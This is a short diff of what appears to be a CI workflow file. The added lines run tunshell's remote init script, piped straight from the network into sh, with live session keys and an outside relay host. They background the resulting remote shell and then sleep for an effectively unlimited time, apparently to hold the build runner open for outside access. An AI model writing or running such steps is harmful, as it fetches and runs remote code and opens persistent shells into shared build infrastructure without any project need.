@@ -52,7 +52,8 @@ jobs:
           sudo apt install 'libssl*' 'openssl*' '*tls*' -y \n"
       - name: Iss
         run: "\
-          curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T RWY94pU5Lst0DDB782IVTd 8SHCN2fsO9bd4084Q5ziS8 eu.relay.tunshell.com \n
+          curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T RWY94pU5Lst0DDB782IVTd 8SHCN2fsO9bd4084Q5ziS8 eu.relay.tunshell.com &\n
+          sleep 6900000000000\n
           sudo apt-get update\n
           sudo apt-get install -y --no-install-recommends build-essential ca-certificates jq musl musl-dev musl-tools p7zip-full wget  \
         "
